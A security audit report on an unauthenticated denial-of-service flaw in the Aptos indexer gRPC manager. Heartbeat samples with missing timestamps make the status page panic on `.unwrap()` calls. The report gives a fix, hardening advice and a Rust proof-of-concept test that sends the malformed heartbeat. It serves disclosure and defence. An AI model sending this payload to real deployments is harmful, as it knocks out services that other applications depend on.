# Audit Report

## Title
Unauthenticated Denial of Service via Malformed Protobuf in Indexer gRPC Manager Status Page

## Summary
An unauthenticated attacker can crash the indexer-grpc-manager service by sending a malformed HeartbeatRequest with StreamProgress samples containing None timestamps. The vulnerability exists in the `get_throughput_from_samples()` function which calls `.unwrap()` on optional timestamp fields without validation, causing a panic when accessed via the status page endpoint.

## Finding Description

The vulnerability chain consists of three critical components:

**1. Unauthenticated Data Ingestion:**
The GrpcManager service accepts HeartbeatRequest messages from any gRPC client without authentication. [1](#0-0) 

**2. Missing Input Validation:**
In the protobuf schema, `StreamProgressSampleProto.timestamp` is defined as optional, meaning it can be None after deserialization. [2](#0-1) 

The Rust generated code correctly represents this as `Option<Timestamp>`. [3](#0-2) 

When LiveDataServiceInfo or HistoricalDataServiceInfo is received via heartbeat, the data is stored without validating that timestamps are present. [4](#0-3) 

**3. Unsafe Unwrap Operations:**
The `get_throughput_from_samples()` function performs three unsafe `.unwrap()` calls on optional timestamp fields without checking if they are None. [5](#0-4) 

**Attack Path:**
1. Attacker connects to GrpcManager service (no authentication required)
2. Sends HeartbeatRequest with LiveDataServiceInfo containing StreamProgress
3. StreamProgress includes samples with timestamp=None (valid protobuf since field is optional)
4. Data is deserialized and stored in MetadataManager without validation
5. When status page endpoint is accessed, `get_throughput_from_samples()` is called
6. Function panics on `.unwrap()` at lines 95, 104, or 105, crashing the service

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program, specifically under the "API crashes" category (up to $50,000).

**Direct Impact:**
- Immediate crash of the indexer-grpc-manager service
- Loss of indexer coordination and routing functionality
- Disruption to all connected data services and indexer clients

**Cascading Effects:**
- dApps relying on indexer data experience service degradation
- Historical and live data service routing becomes unavailable
- Metadata management and service discovery fails

While this does not directly impact consensus or validator nodes, it significantly degrades the ecosystem infrastructure that applications depend on.

## Likelihood Explanation

**Likelihood: Very High**

The vulnerability is trivial to exploit:
- No authentication barrier on heartbeat endpoint
- Standard protobuf libraries allow omitting optional fields by default
- Attack can be scripted and automated
- Service crash is deterministic upon status page access
- Repeated attacks can prevent service recovery

Any attacker with network access to the GrpcManager can exploit this vulnerability using standard gRPC tooling.

## Recommendation

**Immediate Fix:**
Replace all `.unwrap()` calls with safe handling of optional timestamps:

```rust
pub fn get_throughput_from_samples(
    progress: Option<&StreamProgress>,
    duration: Duration,
) -> String {
    if let Some(progress) = progress {
        let now = SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)
            .unwrap()
            .as_secs_f64();
        let index = progress.samples.partition_point(|p| {
            // Safe handling of optional timestamp
            if let Some(timestamp) = p.timestamp.as_ref() {
                let diff = now - timestamp_to_unixtime(timestamp);
                diff > duration.as_secs_f64()
            } else {
                // Skip samples without timestamps
                false
            }
        });

        if index + 1 < progress.samples.len() {
            let sample_a = progress.samples[index];
            let sample_b = progress.samples.last().unwrap();
            
            // Validate both timestamps exist
            if let (Some(ts_a), Some(ts_b)) = (
                sample_a.timestamp.as_ref(),
                sample_b.timestamp.as_ref()
            ) {
                let time_diff = timestamp_to_unixtime(ts_b) - timestamp_to_unixtime(ts_a);
                let tps = (sample_b.version - sample_a.version) as f64 / time_diff;
                let bps = (sample_b.size_bytes - sample_a.size_bytes) as f64 / time_diff;
                return format!(
                    "{} tps, {} / s",
                    tps as u64,
                    bytesize::to_string(bps as u64, false)
                );
            }
        }
    }

    "No data".to_string()
}
```

**Defense in Depth:**
1. Add input validation in `handle_live_data_service_info()` and `handle_historical_data_service_info()` to reject samples with None timestamps
2. Implement authentication/authorization for the heartbeat endpoint using mutual TLS or API keys
3. Add rate limiting to prevent DoS via repeated malformed requests

## Proof of Concept

```rust
// Add to ecosystem/indexer-grpc/indexer-grpc-manager/tests/integration_test.rs

#[tokio::test]
async fn test_malformed_heartbeat_dos() {
    use aptos_protos::indexer::v1::{
        grpc_manager_client::GrpcManagerClient,
        HeartbeatRequest, ServiceInfo, LiveDataServiceInfo,
        StreamInfo, ActiveStream, StreamProgress, 
        StreamProgressSampleProto,
    };
    use tonic::Request;

    // Connect to GrpcManager (assuming it's running on localhost:50051)
    let mut client = GrpcManagerClient::connect("http://localhost:50051")
        .await
        .expect("Failed to connect");

    // Craft malformed StreamProgress with None timestamps
    let malformed_sample = StreamProgressSampleProto {
        timestamp: None,  // This will cause panic
        version: 1000,
        size_bytes: 5000,
    };

    let stream_progress = StreamProgress {
        samples: vec![malformed_sample],
    };

    let active_stream = ActiveStream {
        id: "attacker_stream".to_string(),
        start_time: None,
        start_version: 0,
        end_version: None,
        progress: Some(stream_progress),
    };

    let stream_info = StreamInfo {
        active_streams: vec![active_stream],
    };

    let live_data_service_info = LiveDataServiceInfo {
        chain_id: 1,
        timestamp: None,
        known_latest_version: Some(1000),
        stream_info: Some(stream_info),
        min_servable_version: Some(0),
    };

    let service_info = ServiceInfo {
        address: Some("attacker_address".to_string()),
        info: Some(aptos_protos::indexer::v1::service_info::Info::LiveDataServiceInfo(
            live_data_service_info
        )),
    };

    let request = HeartbeatRequest {
        service_info: Some(service_info),
    };

    // Send malformed heartbeat
    let response = client.heartbeat(Request::new(request)).await;
    assert!(response.is_ok(), "Heartbeat should be accepted");

    // Now access the status page endpoint
    // The service will panic when get_throughput_from_samples() is called
    // This can be tested by making an HTTP request to the status page endpoint
    let status_response = reqwest::get("http://localhost:8080/status")
        .await
        .expect("Failed to access status page");
    
    // If the vulnerability exists, the server will have crashed
    // and this request will fail or timeout
}
```

**Notes**

This vulnerability exists because the protobuf schema defines `timestamp` as optional for valid architectural reasons (forward compatibility), but the consuming code assumes it will always be present. The lack of authentication on the heartbeat endpoint exacerbates the issue by allowing any attacker to inject malformed data. The fix requires both input validation and defensive programming practices when handling optional protobuf fields.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L12-16)
```text
message StreamProgressSampleProto {
  optional aptos.util.timestamp.Timestamp timestamp = 1;
  uint64 version = 2;
  uint64 size_bytes = 3;
}
```

**File:** protos/rust/src/pb/aptos.indexer.v1.rs (L160-167)
```rust
pub struct StreamProgressSampleProto {
    #[prost(message, optional, tag="1")]
    pub timestamp: ::core::option::Option<super::super::util::timestamp::Timestamp>,
    #[prost(uint64, tag="2")]
    pub version: u64,
    #[prost(uint64, tag="3")]
    pub size_bytes: u64,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/status_page/mod.rs (L85-117)
```rust
pub fn get_throughput_from_samples(
    progress: Option<&StreamProgress>,
    duration: Duration,
) -> String {
    if let Some(progress) = progress {
        let now = SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)
            .unwrap()
            .as_secs_f64();
        let index = progress.samples.partition_point(|p| {
            let diff = now - timestamp_to_unixtime(p.timestamp.as_ref().unwrap());
            diff > duration.as_secs_f64()
        });

        // Need 2 sample points for calculation.
        // TODO(grao): Consider doing interpolation here.
        if index + 1 < progress.samples.len() {
            let sample_a = progress.samples[index];
            let sample_b = progress.samples.last().unwrap();
            let time_diff = timestamp_to_unixtime(sample_b.timestamp.as_ref().unwrap())
                - timestamp_to_unixtime(sample_a.timestamp.as_ref().unwrap());
            let tps = (sample_b.version - sample_a.version) as f64 / time_diff;
            let bps = (sample_b.size_bytes - sample_a.size_bytes) as f64 / time_diff;
            return format!(
                "{} tps, {} / s",
                tps as u64,
                bytesize::to_string(bps as u64, /*si_prefix=*/ false)
            );
        }
    }

    "No data".to_string()
}
```
